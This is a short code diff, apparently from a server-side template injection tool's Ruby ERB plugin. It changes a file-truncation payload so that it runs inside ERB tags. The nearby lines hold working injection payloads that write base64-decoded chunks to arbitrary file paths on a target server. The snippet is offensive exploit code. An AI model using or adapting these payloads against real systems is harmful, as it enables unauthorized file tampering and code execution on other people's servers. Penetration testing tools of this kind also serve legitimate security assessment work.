@@ -19,7 +19,7 @@ class Erb(ruby.Ruby):
             'write' : {
                 'call' : 'inject',
                 'write': """<%%= require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) } %%>""",
-                'truncate' : """File.truncate('%(path)s', 0)"""
+                'truncate' : """<%%= File.truncate('%(path)s', 0) %%>"""
             },
             'evaluate_blind' : {
                 'call': 'inject',
